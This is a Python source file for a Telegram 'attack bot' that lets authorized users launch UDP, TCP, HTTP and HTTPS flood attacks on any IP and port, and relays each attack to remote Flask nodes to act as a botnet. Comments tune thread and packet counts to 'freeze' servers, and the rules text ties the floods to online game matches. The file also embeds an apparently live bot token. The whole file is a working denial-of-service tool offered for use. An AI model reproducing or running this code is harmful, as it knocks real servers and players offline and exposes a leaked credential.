import telebot
import socket
import concurrent.futures
import threading
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import requests  # Needed for HTTP/HTTPS






REMOTE_FLASK_NODES = [
  #  "http://node1.yogeshvibez.dpdns.org",
  #  "http://node2.yogeshvibez.dpdns.org",
    # Add as many as you’ve hosted
]




# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '8110690127:AAFXDujImbrz5CeKFJ-I7RYQVIQ5P0MWDyw'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [7343686608]

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 💡 Efficient-Control Settings (Beginner Friendly Guide)
# --------------------------------------------------------

# 🔁 Thread Pool Executor - CPU THREADS (Global Thread Limit)
# This sets how many attack threads your system can run in parallel TOTAL.
# Suggested:
#   🖥️ Weak system (2-core): 50–100
#   ⚡ Mid-range system (4–6-core): 100–200
#   🔥 High-end system (8+ cores): 200–300+
executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)


# 🌐 Threads per Protocol - THREAD COUNT (Attack Intensity)
# This controls how many concurrent threads will launch per attack per protocol.
# More threads = more parallel pressure on the server.
# Suggested values to try freezing small/medium servers:
UDP_THREAD_COUNT = 10     # 🚀 150–300 for heavy UDP flood
TCP_THREAD_COUNT = 10      # 💣 100–200 for connection flood
HTTP_THREAD_COUNT = 10     # 🌐 50–150 for webserver overload
HTTPS_THREAD_COUNT = 8     # 🔐 30–100 (HTTPS uses more CPU)

# 📦 Packet/Request Loop Count - PACKETS PER THREAD (Flood Volume)
# Each thread will send this many packets or requests before restarting.
# Suggested values to freeze a typical server (adjust if needed):
PACKET_LOOP_COUNT_UDP = 3000     # 🔥 UDP: send thousands of packets fast
PACKET_LOOP_COUNT_TCP = 2500      # 💥 TCP: send bursts of data over connections
PACKET_LOOP_COUNT_HTTP = 2000     # 🌐 HTTP: send many GET requests
PACKET_LOOP_COUNT_HTTPS = 1000    # 🔐 HTTPS: keep lower due to encryption overhead

# 🧠 Tips:
# - Use high thread + high packet combo to freeze weak servers.
# - HTTPS uses more CPU/RAM. Don’t go too high on budget devices.
# - These are **aggressive settings**. Reduce if your system lags or crashes.
# - Always test carefully and tweak based on results.

# ✅ One place to control all flood strength easily.
# ✏️ Change these values, and it will reflect across all attack types.


def broadcast_attack_to_nodes(ip, port):
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/start", json={"ip": ip, "port": port}, timeout=5)
            print(f"[✓] Flask Node {node_url} received attack command → {ip}:{port}")
        except Exception as e:
            print(f"[!] Failed to reach {node_url}: {e}")


# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_event.is_set():
        try:
            packet_size = random.randint(64, 1469)
            data = os.urandom(packet_size)
            for _ in range(PACKET_LOOP_COUNT_UDP):
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"UDP flood error: {e}")
            break

# 🚀 Start UDP flood
def start_udp_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(UDP_THREAD_COUNT):
        future = executor.submit(udp_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting UDP flood on {target_ip}:{target_port}")


# 🛠️ Function to send TCP packets
def tcp_flood(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            data = os.urandom(1024)
            for _ in range(PACKET_LOOP_COUNT_TCP):  # tcp requests per thread
                sock.sendall(data)
            sock.close()
        except Exception as e:
            logging.error(f"TCP flood error: {e}")
            break

# 🚀 Start TCP flood
def start_tcp_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(TCP_THREAD_COUNT):
        future = executor.submit(tcp_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting TCP flood on {target_ip}:{target_port}")


# 🛠️ Function to send HTTP packets
def http_flood(target_ip, target_port, stop_event):
    url = f"http://{target_ip}:{target_port}/"
    while not stop_event.is_set():
        try:
            for _ in range(PACKET_LOOP_COUNT_HTTP):  # HTTP requests per thread
                requests.get(url, timeout=2)
        except Exception as e:
            logging.error(f"HTTP flood error: {e}")
            break

# 🚀 Start HTTP flood
def start_http_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(HTTP_THREAD_COUNT):
        future = executor.submit(http_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting HTTP flood on {target_ip}:{target_port}")


# 🛠️ Function to send HTTPS packets
def https_flood(target_ip, target_port, stop_event):
    url = f"https://{target_ip}:{target_port}/"
    while not stop_event.is_set():
        try:
            for _ in range(PACKET_LOOP_COUNT_HTTPS):  # HTTPS requests per thread
                requests.get(url, timeout=2, verify=False)
        except Exception as e:
            logging.error(f"HTTPS flood error: {e}")
            break

# 🚀 Start HTTPS flood
def start_https_flood(user_id, target_ip, target_port):
    stop_event = threading.Event()
    futures = []
    for _ in range(HTTPS_THREAD_COUNT):
        future = executor.submit(https_flood, target_ip, target_port, stop_event)
        futures.append(future)
    user_attacks[user_id] = (futures, stop_event)
    bot.send_message(user_id, f"🚀 Starting HTTPS flood on {target_ip}:{target_port}")


# ✋ Function to stop all attacks for a specific user
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_event = user_attacks[user_id]
        stop_event.set()  # 🛑 Signal threads to stop

        # 🕒 Wait for all processes to finish
        for future in futures:
            future.cancel()

        del user_attacks[user_id]
        bot.send_message(user_id, "🔴 All Attack stopped.")
    else:
        bot.send_message(user_id, "❌ No active attack found >ᴗ<")

# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    log_command(user_id, '/start')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @SoukPy")
        return

    welcome_message = (
        "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
        "🔥 You are now connected.\n"
        "To begin using the bot, type `/help` to see all available commands and how to use them.\n\n"
        "👑 Need support? Contact: @SoukPy\n"
        "📜 Type `/rules` to view the usage rules.\n"
        "✅ You're all set. Let's go!"
    )

    bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown')


# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @SoukPy")
        return

    try:
        command_parts = message.text.split()

        if len(command_parts) == 2:
            protocol = 'udp'
            target = command_parts[1]
        elif len(command_parts) == 3:
            protocol = command_parts[1].lower()
            target = command_parts[2]
        else:
            bot.send_message(message.chat.id, "❌ Invalid format! Use: /attack [protocol] <IP>:<port>")
            return

        target_ip, target_port = target.split(':')
        target_port = int(target_port)

        # ✅ Start local attack
        if protocol == 'udp':
            start_udp_flood(user_id, target_ip, target_port)
        elif protocol == 'tcp':
            start_tcp_flood(user_id, target_ip, target_port)
        elif protocol == 'http':
            start_http_flood(user_id, target_ip, target_port)
        elif protocol == 'https':
            start_https_flood(user_id, target_ip, target_port)
        else:
            bot.send_message(message.chat.id, f"❌ Unknown protocol: {protocol}")
            return

        # ✅ Forward to Flask nodes
        broadcast_attack_to_nodes(target_ip, target_port)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")


# 💬 Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')

    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @SoukPy")
        return

    stop_attack(user_id)
    broadcast_stop_to_nodes()


# 🌐 Forward attack to all subdomain Flask nodes
def broadcast_attack_to_nodes(ip, port):
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/start", json={"ip": ip, "port": port}, timeout=5)
            print(f"[✓] {node_url} → Attack started on {ip}:{port}")
        except Exception as e:
            print(f"[!] {node_url} → Failed to send attack: {e}")


# 🛑 Stop attack on all Flask nodes
def broadcast_stop_to_nodes():
    for node_url in REMOTE_FLASK_NODES:
        try:
            response = requests.post(f"{node_url}/stop", timeout=5)
            print(f"[✓] {node_url} → Attack stopped")
        except Exception as e:
            print(f"[!] {node_url} → Failed to stop: {e}")




# 💬 Command handler for /id
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username
    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
                                      f"👥 Your Username is: @{username}")

    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot_owner = "all4outgaming1"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")

# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    rules_message = (
        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
        "6. Report issues! 🛡️ Message the owner for any problems.\n"
        "7. Always check your command before executing! ✅\n"
        "8. Do not attack without permission! ❌⚠️\n"
        "9. Be aware of the consequences of your actions! ⚖️\n"
        "10. Stay within the limits and play fair! 🤗"
    )
    bot.send_message(message.chat.id, rules_message)

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    bot.send_message(message.chat.id, "📞 Contact the owner: @SoukPy")

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.send_message(message.chat.id, ping_response)
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")

def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    help_message = (
        "🤖 **BOT COMMANDS & HELP GUIDE** 🤖\n\n"

        "📌 **General Commands:**\n"
        "🔹 /start - Start the bot and show welcome message 🔋\n"
        "🔹 /help - Show this help message 🤝\n"
        "🔹 /rules - Show the usage rules 📚\n"
        "🔹 /owner - Contact the owner 👑\n"
        "🔹 /id - Show your Telegram user ID 👤\n"
        "🔹 /uptime - Show bot uptime ⏱️\n"
        "🔹 /ping - Test your connection latency 📡\n\n"

        "💥 **Attack Commands:**\n"
        "🔫 /attack `<IP>:<port>` - Launch a default UDP attack 🌐\n"
        "🔫 /attack `<protocol>` `<IP>:<port>` - Launch using custom protocol 🔥\n"
        "   ➤ Example (UDP default): `/attack 192.168.1.10:8080`\n"
        "   ➤ Example (explicit UDP): `/attack udp 192.168.1.10:8080`\n"
        "   ➤ Example (TCP): `/attack tcp 192.168.1.10:2920`\n"
        "   ➤ Example (HTTP): `/attack http 203.0.113.25:80`\n"
        "   ➤ Example (HTTPS): `/attack https 203.0.113.25:443`\n\n"

        "🛑 /stop - Immediately stop all your active attacks ❌\n\n"

        "💡 **Tips:**\n"
        "• Protocol is not case-sensitive (e.g., `TCP`, `tcp`, `Tcp` all work) ✅\n"
        "• If you do not specify a protocol, it defaults to **UDP** ⚡\n"
        "• Use valid IP and port format like `1.1.1.1:80` 🌐\n"
        "• Be responsible and follow the /rules 🤝\n\n"

        "👑 **Owner Contact:**\n"
        "Telegram & Instagram: @SoukPy"
    )
    bot.send_message(message.chat.id, help_message, parse_mode='Markdown')



# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")

